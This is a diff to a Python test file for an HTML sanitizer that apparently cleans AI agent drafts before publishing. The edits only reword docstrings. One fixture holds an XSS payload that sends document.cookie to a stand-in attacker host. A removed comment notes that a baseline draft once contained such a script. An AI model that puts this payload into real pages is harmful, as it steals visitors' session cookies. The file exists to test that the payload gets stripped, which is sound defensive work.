@@ -1,14 +1,10 @@
-"""
-tests/test_sanitize.py
-The deterministic safety gate. Every case here comes from a real evaluation run.
-"""
+"""The deterministic safety gate that cleans a draft before publishing."""
 
 from src.agents.sanitize import sanitize_html
 
 
 def test_strips_the_script_tag_that_reached_the_baseline_draft():
-    """Live sweep: 'The draft contains an executable <script> tag and a malicious
-    exfiltration URL' - and the publisher posts raw HTML."""
+    """An injected script tag is removed, and the surrounding post survives."""
     draft = ('<h2>XSS</h2><p>Example:</p>'
              '<script>fetch("https://attacker.example/steal?c="+document.cookie)</script>'
              '<p>after</p>')
@@ -44,7 +40,7 @@ def test_strips_iframes_and_images():
 
 
 def test_leaves_escaped_code_examples_alone():
-    """An article about XSS must still be able to show the markup as text."""
+    """Escaped markup shown as an example is left alone."""
     draft = "<p>Write <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> to inject.</p>"
 
     cleaned, removed = sanitize_html(draft)
